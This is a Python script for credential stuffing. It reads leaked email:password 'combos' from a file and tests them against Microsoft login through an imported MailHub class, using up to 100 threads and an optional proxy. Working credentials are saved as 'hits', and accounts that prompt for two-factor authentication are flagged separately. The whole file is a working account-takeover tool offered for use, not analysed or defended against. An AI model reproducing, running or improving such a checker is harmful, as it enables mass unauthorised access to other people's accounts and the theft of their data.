import os
import sys
from datetime import datetime
from mailhub import MailHub
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time

class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

print_lock = Lock()
file_lock = Lock()
stats_lock = Lock()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_combos(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            combos = [line.strip() for line in f if line.strip() and ':' in line]
        return combos
    except FileNotFoundError:
        print(f"{Colors.RED}[ERROR] File '{filename}' not found!{Colors.RESET}")
        print(f"{Colors.YELLOW}[INFO] Creating empty combos.txt file...{Colors.RESET}")
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("")
        return []
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Failed to read file: {str(e)}{Colors.RESET}")
        return []

def save_hit(content):
    try:
        with file_lock:
            os.makedirs('results', exist_ok=True)
            filepath = os.path.join('results', 'hits.txt')
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
                f.flush()
            return True
    except Exception as e:
        with print_lock:
            print(f"\n{Colors.RED}[ERROR] Failed to save hit: {str(e)}{Colors.RESET}")
        return False

def check_account(checker, email, password, proxy=None):
    try:
        result = checker.loginMICROSOFT(email, password, proxy)
        
        if result[0] == "ok":
            return "HIT"
        elif result[0] == "nfa":
            return "2FA"
        else:
            return "BAD"
            
    except Exception:
        return "BAD"

def is_valid_email(email):
    """Basic email validation"""
    if not email or len(email) < 3:
        return False
    if '@' not in email or '.' not in email:
        return False
    if email.startswith('http') or email.startswith('www'):
        return False
    if '--' in email or '__' in email:
        return False
    local, domain = email.split('@', 1) if '@' in email else ('', '')
    if not local or not domain or '.' not in domain:
        return False
    return True

def process_combo(combo, proxy, stats):
    checker = None
    try:
        # Skip invalid lines immediately
        if ':' not in combo or combo.startswith('http') or combo.startswith('www') or '--' in combo:
            with stats_lock:
                stats['checked'] += 1
                stats['bad'] += 1
            with print_lock:
                print(f"{Colors.RED}[INVALID] {combo}{Colors.RESET}")
            return
            
        email, password = combo.split(':', 1)
        
        # Validate email format
        if not is_valid_email(email):
            with stats_lock:
                stats['checked'] += 1
                stats['bad'] += 1
            with print_lock:
                print(f"{Colors.RED}[INVALID] {combo}{Colors.RESET}")
            return
        
        checker = MailHub()
        
        status = check_account(checker, email, password, proxy)
        
        with stats_lock:
            stats['checked'] += 1
            
            if status == "HIT":
                stats['hits'] += 1
                save_hit(combo)
                with print_lock:
                    print(f"{Colors.GREEN}[VALID] {combo}{Colors.RESET}")
            elif status == "2FA":
                stats['2fa'] += 1
                with print_lock:
                    print(f"{Colors.YELLOW}[2FA] {combo}{Colors.RESET}")
            else:
                stats['bad'] += 1
                with print_lock:
                    print(f"{Colors.RED}[INVALID] {combo}{Colors.RESET}")
            
    except Exception:
        with stats_lock:
            stats['checked'] += 1
            stats['bad'] += 1
        with print_lock:
            print(f"{Colors.RED}[INVALID] {combo}{Colors.RESET}")
    finally:
        if checker:
            try:
                del checker
            except:
                pass

def run_checker():
    clear_screen()
    
    combo_file = "combos.txt"
    
    print(f"{Colors.BLUE}[*] Loading combos from {combo_file}...{Colors.RESET}")
    combos = load_combos(combo_file)
    
    if not combos:
        print(f"{Colors.RED}[!] No valid combos found in combos.txt{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Please add your combos and run again{Colors.RESET}")
        input(f"\n{Colors.WHITE}Press Enter to exit...{Colors.RESET}")
        return
    
    print(f"{Colors.GREEN}[✓] Loaded {len(combos)} combos{Colors.RESET}")
    
    threads_input = input(f"{Colors.YELLOW}Number of threads (default 25, max 100): {Colors.RESET}").strip()
    try:
        threads = int(threads_input) if threads_input else 25
        threads = max(1, min(threads, 100))
    except ValueError:
        threads = 25
    
    print(f"{Colors.GREEN}[✓] Using {threads} threads{Colors.RESET}")
    
    use_proxy = input(f"{Colors.YELLOW}Use proxies? (y/n): {Colors.RESET}").strip().lower()
    proxy = None
    
    if use_proxy == 'y':
        proxy_input = input(f"{Colors.YELLOW}Enter proxy: {Colors.RESET}").strip()
        if proxy_input:
            proxy = {
                'http': proxy_input,
                'https': proxy_input
            }
            print(f"{Colors.GREEN}[✓] Proxy configured{Colors.RESET}")
    
    stats = {
        'total': len(combos),
        'checked': 0,
        'hits': 0,
        '2fa': 0,
        'bad': 0
    }
    
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}Starting check...{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(process_combo, combo, proxy, stats) for combo in combos]
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Checker stopped by user{Colors.RESET}")
    
    end_time = time.time()
    elapsed = end_time - start_time
    cpm = (stats['checked'] / elapsed * 60) if elapsed > 0 else 0
    
    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}Checking Complete!{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}\n")
    
    print(f"{Colors.WHITE}Time Elapsed:    {elapsed:.2f} seconds{Colors.RESET}")
    print(f"{Colors.WHITE}CPM:             {cpm:.0f}{Colors.RESET}")
    print(f"{Colors.WHITE}Total Checked:   {stats['checked']}/{stats['total']}{Colors.RESET}")
    print(f"{Colors.GREEN}Valid:           {stats['hits']}{Colors.RESET}")
    print(f"{Colors.YELLOW}2FA:             {stats['2fa']}{Colors.RESET}")
    print(f"{Colors.RED}Invalid:         {stats['bad']}{Colors.RESET}\n")
    
    if stats['hits'] > 0:
        print(f"{Colors.GREEN}[✓] Valid accounts saved to 'results/hits.txt'{Colors.RESET}\n")
    
    input(f"{Colors.WHITE}Press Enter to exit...{Colors.RESET}")

if __name__ == "__main__":
    try:
        run_checker()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program terminated by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR] Unexpected error: {str(e)}{Colors.RESET}")
        input(f"{Colors.WHITE}Press Enter to exit...{Colors.RESET}")
        sys.exit(1)